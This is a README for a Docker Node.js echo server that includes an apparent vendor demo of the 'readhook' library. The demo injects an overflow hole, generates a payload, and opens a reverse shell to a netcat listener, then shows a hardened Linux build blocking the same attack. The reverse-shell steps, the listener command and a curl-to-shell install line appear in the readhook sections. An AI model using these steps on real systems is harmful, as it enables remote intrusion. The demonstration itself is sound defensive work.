# node-echo-server
Docker node.js echo-server repository.

## Running
```
./run.sh
# OR
docker run -d --rm --name echo -p 8080:8080 polyverse/node-echo-server
```

## Stopping
```
docker kill echo
```

## Running interactively (equivalent to automated running described above).
```
docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh

node echo-server.js
```
# Using node-echo-server to demonstrate readhook.
(Note: In the following steps, you will need to have a listener running that the reverse-shell will try to connect to. On a Mac, this can look like this:
```
nc -l 5555
```

## Running interactively w/readhook
The following commands add and then run with readhook.
```
docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh

apk update && apk add wget ca-certificates && update-ca-certificates

wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins/basehook.so
wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/jenkins/fullhook.so

LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" node echo-server.js
```

### With the above running container,
a) Generate a payload (e.g. curl localhost:8080/xyzzxMAKELOAD<ip-address><:port>)
b) Pass the payload back to confirm that it creates a reverse shell to the listener.
```
curl localhost:8080/xyzzx:MAKELOADdocker.for.mac.localhost:5555
# <Save this output. It is the payload that will work in OVERFLOW>

curl localhost:8080/xyzzy:OVERFLOW<...the rest of the saved output from above.>
# <Check your listener. It should have a reverse shell to the container.>
```

## Running interactively w/readhook and Polyverse Polymorphic Linux
```
docker run -it --rm --name echo -p 8080:8080 polyverse/node-echo-server /bin/sh

apk update && apk add wget ca-certificates && update-ca-certificates

wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins/basehook.so

curl https://repo.polyverse.io/install.sh | sh -s <your-api-token>

LD_PRELOAD=/tmp/basehook.so node echo-server.js
```

### Repeat Step b (from above) and confirm that it _does not_ create a reverse shell when Polyverse Polymorphic Linux is installed.
